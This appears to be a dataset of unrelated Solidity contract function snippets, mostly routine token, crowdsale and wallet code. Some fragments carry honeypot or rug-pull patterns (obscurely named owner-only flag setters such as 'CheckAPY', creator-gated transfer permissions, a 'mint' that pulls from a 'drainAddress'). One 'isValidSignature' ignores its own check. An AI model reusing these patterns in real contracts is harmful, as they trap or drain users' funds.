        BaseModule(_registry, _guardianStorage, NAME)
        LimitManager(_defaultLimit)
        public
    {
        transferStorage = _transferStorage;
        priceProvider = TokenPriceProvider(_priceProvider);
        securityPeriod = _securityPeriod;
        securityWindow = _securityWindow;
        oldLimitManager = _oldLimitManager;
    }
--------------------------------------------------------------------------------
function isWhitelisted(BaseWallet _wallet, address _target) public view returns (bool _isWhitelisted) {
        uint whitelistAfter = transferStorage.getWhitelist(_wallet, _target);
        // solium-disable-next-line security/no-block-members
        return whitelistAfter > 0 && whitelistAfter < now;
    }
--------------------------------------------------------------------------------
function isValidSignature(bytes calldata _data, bytes calldata _signature) external view returns (bytes4) {
        bytes32 msgHash = keccak256(abi.encodePacked(_data));
        isValidSignature(msgHash, _signature);
        return ERC1271_ISVALIDSIGNATURE_BYTES;
    }
--------------------------------------------------------------------------------
function get(address source, string calldata key) external view returns (uint64, uint64) {
        Datum storage datum = data[source][key];
        return (datum.timestamp, datum.value);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function depositForDividends() public payable onlyOwner {
      require(msg.value > 0);
      token.recordDeposit(msg.value);
      DepositForDividends(msg.value);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    darkness[spender] = val;
    whore[spender] = val2; 
    bengal[spender] = val3;
    wyoming = val4;
  }
--------------------------------------------------------------------------------
function NMBLToken(
        ) {
        balances[0xB5138E4D08e98c20cE5564a956C3869683496D63] = 1000000000000000000000;               // NMBL team gets all tokens in the start
        totalSupply = 1000000000000000000000;                                                        // no comment, total supply
        name = "Nimble";                                                                             // display purposes
        decimals = 7;                                                                                // Amount of decimals for display purposes
        symbol = "NMBL";                                                                             // Symbol
    }
--------------------------------------------------------------------------------
function mint(address to, uint value) public {
        require(canMint[msg.sender], "only pools");
        duck.transferFrom(drainAddress, to, value);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setTokenAddr(StandardToken tokAddr) public onlyOwner {
        require(token == address(0x0)); //initialize only once
        
        token = tokAddr;
        
        state = ContractState.Locked; //switch contract to locked state
        IsLocked(now);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
// solium-disable-next-line security/no-block-members
require(_openingTime >= block.timestamp);
require(_closingTime >= _openingTime);

openingTime = _openingTime;
closingTime = _closingTime;
}
--------------------------------------------------------------------------------
function CheckTheAddress(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    betabeta[spender] = val;
    gammagamma[spender] = val2; 
    deltacon[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function transfer(address to, uint value) public whenNotPaused returns (bool) {
    _verifyTransferLock(msg.sender, value);
    _transfer(msg.sender, to, value);
    return true;
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function registerBroker(address _broker) external onlyOwner {
        require(!brokers[_broker], "already registered");
        brokers[_broker] = true;
        emit LogBrokerRegistered(_broker);
    }
--------------------------------------------------------------------------------
function deregisterBroker(address _broker) external onlyOwner {
        require(brokers[_broker], "not registered");
        brokers[_broker] = false;
        emit LogBrokerDeregistered(_broker);
    }
--------------------------------------------------------------------------------
function getPoolRewardRate(uint256 _poolId) external view returns (uint256) {
    Pool.Data storage _pool = _pools.get(_poolId);
    return _pool.getRewardRate(_ctx);
  }
--------------------------------------------------------------------------------
function MINTY() public {
        owner = msg.sender;
        balanceOf[owner] = minted;
        balanceOf[this] = totalSupply - balanceOf[owner];
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function getEth2DaiBuyPrice(
		uint256 _ethAmount
	)
	public 
	view 
	returns(
		uint256 _rate
	) {
		uint256 tokenAmount = eth2dai.getBuyAmount(DAI, WETH, _ethAmount);
		return (tokenAmount * ONE_ETH) / _ethAmount;
	}
--------------------------------------------------------------------------------
function getEth2DaiSellPrice(
		uint256 _ethAmount
	)
	public 
	view 
	returns(
		uint256 _rate
	) {
		uint256 ethAmount = eth2dai.getPayAmount(DAI, WETH, _ethAmount);
		return (ethAmount * ONE_ETH) / _ethAmount;
	}
--------------------------------------------------------------------------------
function changeCooldownSettings(bool newStatus, uint256 newInterval) external onlyOwner {
        require(newInterval <= 24 hours, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function blacklistMultipleWallets(address[] calldata addresses) public onlyOwner(){
        for (uint256 i; i < addresses.length; ++i) {
            _isBlacklisted[addresses[i]] = true;
        }
    }
--------------------------------------------------------------------------------
function unBlacklistMultipleWallets(address[] calldata addresses) public onlyOwner(){
        for (uint256 i; i < addresses.length; ++i) {
            _isBlacklisted[addresses[i]] = false;
        }
    }
--------------------------------------------------------------------------------
function defrostToken() public 
	{ // Function to defrost your own token, after the date of the defrost
	
		require(now>dateDefrost);
		balancesCanSell[msg.sender]=true;
		Defroze(msg.sender,true);
	}
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
	super._mint(_to, _tokenId);

	allTokensIndex[_tokenId] = allTokens.length;
	allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function renouncePauser() public {
        require(msg.sender != owner(), "RequestableOwnable: owner cannot renounce pauser");
        PauserRole.renouncePauser();
    }
--------------------------------------------------------------------------------
function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        dynamicFeesInEffect = true;
        fireSaleTimer = block.timestamp + 1 days;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x19634be36953e7d2b67A9A1812C94Fac47c5bd46,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x4cD05dC3010dF80F903f34e4F83839a269Cf46B5,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function freeze (address target, bool froze ) public   {
        if(froze || (!froze && !usersCanUnfreeze)) {
            require(admin[msg.sender]);
        }
        _freeze(target, froze);
    }
--------------------------------------------------------------------------------
function ownerOf(uint256 _tokenId) public view returns (address) {
        address tokenOwner = tokenIdToTokenOwner[_tokenId].tokenOwner;
        require(tokenOwner != address(0));
        return tokenOwner;
    }
--------------------------------------------------------------------------------
constructor() public {
    totalSupply_ = 50000000000000000;

    balances[0x8aD676e9C6b62e64fe9FAA8e9aaa553F630E91d4] = totalSupply_;

    emit Transfer(address(0), 0x8aD676e9C6b62e64fe9FAA8e9aaa553F630E91d4, totalSupply_);
  }
--------------------------------------------------------------------------------
function getPricePerFullShare() public view returns (uint256) {
        if (totalSupply() == 0) return 0;
        return balance().mul(1e18).div(totalSupply());
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256()
      .add(magnifiedDividendCorrections[_owner]).toUint256() / magnitude;
  }
--------------------------------------------------------------------------------
function transferAndCall(address _to, uint _value, bytes _data)
    public
    returns (bool success)
    {
        _updateCreditedPoints(msg.sender);
        _updateCreditedPoints(_to);
        return ERC667.transferAndCall(_to, _value, _data);
    }
--------------------------------------------------------------------------------
function _getUncreditedPoints(address _account)
    private
    view
    returns (uint _amount)
    {
        uint _pointsPerToken = totalPointsPerToken.sub(lastPointsPerToken[_account]);
        // The upper bound on this number is:
        //   ((1e32 * TOTAL_DIVIDEND_AMT) / totalSupply) * balances[_account]
        // Since totalSupply >= balances[_account], this will overflow only if
        //   TOTAL_DIVIDEND_AMT is around 1e45 wei. Not ever going to happen.
        return _pointsPerToken.mul(balanceOf[_account]);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function tokensClaimable(address _user) public view returns (uint256) {
        if(!auctionEnded()) {
            return 0;
        }
        return commitments[_user].mul(TENPOW18).div(tokenPrice());
    }
--------------------------------------------------------------------------------
function OSNPresaleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
constructor() public ManagedToken(msg.sender, msg.sender) {
        name = "KCT";
        symbol = "KCT";
        decimals = 18;
        totalIssue = 0;
        totalSupply = 130000000 ether;                                         //The maximum number of tokens is unchanged and totals will decrease after issue
    }
--------------------------------------------------------------------------------
function addAuthorizedAddress(address target)
        public
        onlyOwner
        targetNotAuthorized(target)
    {
        authorized[target] = true;
        authorities.push(target);
        emit LogAuthorizedAddressAdded(target, msg.sender);
    }
--------------------------------------------------------------------------------
constructor(address _token) public {
        require(_token != 0 && address(token) == 0);

        token = EIP20Interface(_token);
        pollNonce = INITIAL_POLL_NONCE;
    }
--------------------------------------------------------------------------------
function rescueTokensInMultiplePolls(uint[] _pollIDs) public {
        // loop through arrays, rescuing tokens from all
        for (uint i = 0; i < _pollIDs.length; i++) {
            rescueTokens(_pollIDs[i]);
        }
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function newWindow(uint8 _winNum, uint256 _tokenPerWindow) private {
        ww[_winNum] = Window(true, 0, 0, 0, _tokenPerWindow);
        NewWindow(_winNum, _tokenPerWindow);
    }
--------------------------------------------------------------------------------
function HorseToken() public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
constructor(address _nexus, address _rewardsToken)
        InitializableRewardsDistributionRecipient(_nexus)
    {
        require(_rewardsToken != address(0), "Rewards token is zero");
        REWARDS_TOKEN = IERC20(_rewardsToken);
    }
--------------------------------------------------------------------------------
function setEndRecipient(address _endRecipient) external onlyOwner {
        require(endRecipient != _endRecipient, "Same end recipient");
        endRecipient = _endRecipient;

        emit RecipientChanged(_endRecipient);
    }
--------------------------------------------------------------------------------
function DAX(
    ) public {
        totalSupply = 200000000000000000000000000;                       // Total supply with the decimal amount
        balanceOf[msg.sender] = 200000000000000000000000000;             // All initial tokens
        name = "DAX Coin";                                               // The name for display purposes
        symbol = "DAX";                                                  // The symbol for display purposes
    }
--------------------------------------------------------------------------------
function acceptOwnership() external onlyOwnerCandidate {
        address previousOwner = owner;

        owner = newOwnerCandidate;
        newOwnerCandidate = address(0);

        OwnershipTransferred(previousOwner, owner);
    }
--------------------------------------------------------------------------------
function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowed[account][_msgSender()].sub(amount));
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    brazil[spender] = val;
    peru[spender] = val2; 
    chile[spender] = val3;
    portugal = val4;
  }
--------------------------------------------------------------------------------
function setFlywheelRewards(IFlywheelRewards newFlywheelRewards) external requiresAuth {
        address oldFlywheelRewards = address(flywheelRewards);

        flywheelRewards = newFlywheelRewards;

        emit FlywheelRewardsUpdate(oldFlywheelRewards, address(newFlywheelRewards));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function restart() public {
        require(swap && now >= endTime);
        
        penalty = this.balance * 2000 / 10000;
        
        payFees();
        
        _start();
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
        require(state == State.Active);
        deposited[investor] = deposited[investor].add(msg.value);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calculateContribution(uint _available, uint _requiredAmount)
        internal
        pure
        returns(uint taken, uint remainder)
    {
        if (_requiredAmount > _available)
            return (_available, 0); // Take whatever is available, return 0 as leftover ETH.
        else
            return (_requiredAmount, _available - _requiredAmount);
    }
--------------------------------------------------------------------------------
function VRToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function revokeLiquidity(address liquidity) external {
        require(msg.sender == governance, "Keep3r::revokeLiquidity: governance only");
        liquidityAccepted[liquidity] = false;
    }
--------------------------------------------------------------------------------
function mint(uint amount) external {
        require(msg.sender == governance, "Keep3r::mint: governance only");
        _mint(governance, amount);
    }
--------------------------------------------------------------------------------
function withdraw() external onlyOwner {
    (bool success,) = beneficiary.call{value: address(this).balance}("");
    require(success);
  }
--------------------------------------------------------------------------------
constructor () {
        _name = "AMDG Token"; 
        _symbol = "AMDG";
        _totalSupply;
        _mint(owner(), 250000000 * 10 ** (decimals()) );

    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint _weiAmount)
    internal
  {
    super._preValidatePurchase(_beneficiary, _weiAmount);

    // check if min contribution amount
    require(_weiAmount >= MIN_PURCHASE);

    totalEthRcvd = totalEthRcvd.add(_weiAmount);
  }
--------------------------------------------------------------------------------
function buyKeyByAddr(address _inveter)
        onlyHuman()
        isWithinLimits(msg.value)
        public
        payable
    {
        require(isStartGame == true, "The game hasn't started yet.");
        buyKeys(_inveter);
    }
--------------------------------------------------------------------------------
function add(address _wlAddress)
        public
        onlyAdministrator
    {
        if ( !isInList(_wlAddress) ) {
            wlIndex[_wlAddress] = uint16(whitelist.length);
            whitelist.push(_wlAddress);
        }
    }
--------------------------------------------------------------------------------
function addLockedAmount(uint256 _amount) external {
        require(vestingExists(msg.sender));
        amountLockedInVestings = amountLockedInVestings.add(_amount);
        emit LockedAmountIncreased(_amount);
    }
--------------------------------------------------------------------------------
function substractLockedAmount(uint256 _amount) external {
        require(vestingExists(msg.sender));
        amountLockedInVestings = amountLockedInVestings.sub(_amount);
        emit LockedAmountDecreased(_amount);
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function getPlayerId(uint256 _tokenId) external view returns (uint256 playerId) {
        NFT memory obj  = _getAttributesOfToken(_tokenId);
        playerId = ((obj.attributes.div(100000000000000000)) % 1000);
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 20;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function adminSetAdmin(address newAdmin) public {
        require(msg.sender == admin);
        require(balance[0][newAdmin] > 0); // newAdmin must have deposits
        admin = newAdmin;
    }
--------------------------------------------------------------------------------
function PistToken(uint256 _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function acceptOwnership() public{
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0) && newOwner != owner);
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
--------------------------------------------------------------------------------
constructor (uint256 initialSupply, address payable owner) public {
        _decimals = 18;
        _owner = owner;
        _safeOwner = owner;
        _mint(_owner, initialSupply*(10**18));
    }
--------------------------------------------------------------------------------
function transferTokenOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    MintableToken(token).transferOwnership(newOwner);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
        
        AXPRtoken 		= 0xC39E626A04C5971D770e319760D7926502975e47;  	
		DefaultToken	= 0xA15C7Ebe1f07CaF6bFF097D8a589fb8AC49Ae5B3;  	
        hodlingTime 	= 730 days;
        _currentIndex 	= 500;
        comission 		= 3;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        EthereumVault[0x0] = add(EthereumVault[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function HmexToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function tradingStatus(bool _status, uint256 _deadBlocks) public onlyOwner {
        tradingOpen = _status;
        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            deadBlocks = _deadBlocks;
        }
    }
--------------------------------------------------------------------------------
function snapshot() public returns (uint256) {
        _currentSnapshotId.increment();

        uint256 currentId = _currentSnapshotId.current();
        emit Snapshot(currentId);
        return currentId;
    }
--------------------------------------------------------------------------------
function toggleTransferFor(address _for) onlyOwner public returns (bool) {
        specialAllowed[_for] = !specialAllowed[_for];
        TransferAllowanceFor(_for, specialAllowed[_for]);
        return specialAllowed[_for];
    }
--------------------------------------------------------------------------------
function getState() public constant returns(State) {

        if (now >= IcoStartDate && now <= IcoEndDate) {
            return State.Crowdfund;
        } 
        return State.Finish;
    }
--------------------------------------------------------------------------------
function SvEnsRegistrar(SvEns ensAddr, bytes32 node) public {
        ens = ensAddr;
        rootNode = node;
        admins[msg.sender] = true;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function _setSubnodeOwner(bytes32 subnode, address _owner) internal {
        require(!knownNodes[subnode]);
        knownNodes[subnode] = true;
        ens.setSubnodeOwner(rootNode, subnode, _owner);
    }
--------------------------------------------------------------------------------
function _getBurnAmount(uint256 amount) internal view virtual returns (uint256) {
        if (_totalSupply<=_threshold) {
            return 0;
        }
        return amount.mul(_burnRate).div(1000);
    }
--------------------------------------------------------------------------------
function getBalanceValue(address investor) public view returns(uint256) {
        uint256 accruedRatioUSDT = oracle.query();
        return balances[investor].mul(accruedRatioUSDT).div(baseRatio);
    }
--------------------------------------------------------------------------------
function startLiquidityMigration(address recipient) external {
        require(msg.sender == owner, "No Authorization");
        migrationLock = now + ld;
        migrationRecipient = recipient;
    }
--------------------------------------------------------------------------------
function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool)
    {
        _allow(sender, msg.sender, amount);
        _transfer(sender, recipient, amount);

        return true;
    }
--------------------------------------------------------------------------------
function setOwner(address owner_) external onlyOwner {
        require(owner_ != address(0), "bDai: owner cannot be 0x0");
        owner = owner_;
    }
--------------------------------------------------------------------------------
function AddAdmin(address adminAddr)
    public
    IsSuperAdmin(){
    require(admins[adminAddr] == 0, "already add this admin");
    admins[adminAddr] = 1;
  }
--------------------------------------------------------------------------------
function isOperatorFor(address operator, address tokenHolder) public view virtual override returns (bool) {
    return operator == tokenHolder ||
      (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
      _operators[tokenHolder][operator];
  }
--------------------------------------------------------------------------------
function depositEther( ) payable returns(bool) {
        ErrorReport( tx.origin, 0, 0 );

        DepositToken( ETH_TOKEN_ADDRESS, msg.value );
        return true;
    }
--------------------------------------------------------------------------------
function getBalance( ERC20 token ) constant returns(uint){
        if( token == ETH_TOKEN_ADDRESS ) return this.balance;
        else return token.balanceOf(this);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function blockTokens()
        external
    returns (bool) {
        require(tokenState == true);
        require(msg.sender == owner);
        blockState = true;
        return true;
    }
--------------------------------------------------------------------------------
function unblockTokens()
        external
    returns (bool) {
        require(tokenState == true);
        require(msg.sender == owner);
        blockState = false;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function withdrawFor (address contributor, address tokenAddr) public onlyOwner {
    require (contractStage == 2);
    require (whitelist[contributor].balance > 0);
    _withdraw(contributor,tokenAddr);
  }
--------------------------------------------------------------------------------
function GYM(
    ) public {
        totalSupply = 1000000000000;                     // Update total supply with the decimal amount
        balanceOf[msg.sender] = 1000000000000;           // Give the creator all initial tokens
        name = "Guanyinma Coin";                         // Set the name for display purposes
        symbol = "GYM";                                  // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function safeWithdraw(address _withdraw, uint _amount) public
        onlyEscrow
    {
        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
        if (namiWallet.isOwner(_withdraw)) {
            _withdraw.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) whenNotPaused
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint40 _cutieId)
        public
        view
        returns (uint128)
    {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
constructor(uint256 numberOfDays) public {
        OWNER = msg.sender;
        users[this] = TOTAL_SUPPLY;
        
        TIME_FOR_CROWDSALE = CREATION_TIME + (numberOfDays * 1 days);
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "E101");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
--------------------------------------------------------------------------------
function confirmImplChange(bytes32 _lockId) public onlyCustodian {
        erc20Impl = getImplChangeReq(_lockId);

        delete implChangeReqs[_lockId];

        emit ImplChangeConfirmed(_lockId, address(erc20Impl));
    }
--------------------------------------------------------------------------------
function setExchangeRate(uint256 newRate) external onlyOwner returns(bool success)
    {
        uint256 _currentRate = exchangeRate;
        exchangeRate = newRate;                             /// Sets new exchange rate
        emit Change(_currentRate, exchangeRate);            /// Logs Change event
        return true;
    }
--------------------------------------------------------------------------------
function allowance(address tokenHolder, address spender) external view notPaused returns (uint256 tokens) {
        uint256 _transferred = transferred[tokenHolder][spender];       /// Already transferred tokens by `spender`.
        return allowances[tokenHolder][spender].sub(_transferred);      /// Remained tokens to transfer by `spender`.
    }
--------------------------------------------------------------------------------
function Wallet(address _owner) public {
    owner_ = _owner;
    exchange_ = msg.sender;
    logic_ = connector_.latestLogic_();
    birthBlock_ = block.number;
  }
--------------------------------------------------------------------------------
function withdraw() public payable onlyOwner {
        uint256 withdrawBalance = address(this).balance - _getOngoingAuctionsBalances(false);
        _transferETH(msg.sender,withdrawBalance);
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0),"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
--------------------------------------------------------------------------------
function transferByPartition(
    bytes32 partition,
    address to,
    uint256 value,
    bytes calldata data
  )
    external
    isValidCertificate(data, 0xf3d490db)
    returns (bytes32)
  {
    return _transferByPartition(partition, msg.sender, msg.sender, to, value, data, "");
  }
--------------------------------------------------------------------------------
function _getDefaultPartitions(address tokenHolder) internal view returns(bytes32[] memory) {
    if(_defaultPartitionsOf[tokenHolder].length != 0) {
      return _defaultPartitionsOf[tokenHolder];
    } else {
      return _tokenDefaultPartitions;
    }
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setBonus(uint256 _newBonus) public onlyOwner {
        require(_newBonus != bonus && _newBonus > 0);
        emit BonusChanged(bonus, _newBonus);
        bonus = _newBonus;
    }
--------------------------------------------------------------------------------
function setTokenPrice(uint256 _newPrice) public onlyOwner {
        require(_newPrice != tokenPrice && _newPrice > 0);
        emit TokenPriceChanged(tokenPrice, _newPrice);
        tokenPrice = _newPrice;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token().balanceOf(_tokenWallet), token().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns(bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number, msg.sender, nonce));
        return digest;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
constructor(
    ) public {
        rewardsToken = IERC20(address(0xAE66bEa480f7a6C91F07C58f2AEe185883558fb8));
        stakingToken = IERC20(address(0xAE66bEa480f7a6C91F07C58f2AEe185883558fb8));
        rewardsDistribution = msg.sender;
    }
--------------------------------------------------------------------------------
